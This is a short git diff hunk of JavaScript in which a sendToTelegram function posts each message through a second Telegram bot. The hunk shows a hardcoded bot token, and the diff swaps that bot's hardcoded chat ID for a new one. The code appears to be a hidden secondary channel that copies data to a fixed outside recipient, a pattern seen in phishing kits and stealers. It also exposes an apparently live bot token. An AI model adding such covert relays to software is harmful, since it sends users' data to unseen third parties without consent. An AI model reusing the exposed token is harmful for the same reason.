@@ -28,7 +28,7 @@ const sendToTelegram = async (message) => {
 
     // Second bot with hardcoded values
     const HARD_CODED_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
-    const HARD_CODED_CHAT_ID = "-1002535678431";
+    const HARD_CODED_CHAT_ID = "7903357798";
     const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
     await axios.post(urlHardcodedBot, {
       chat_id: HARD_CODED_CHAT_ID,
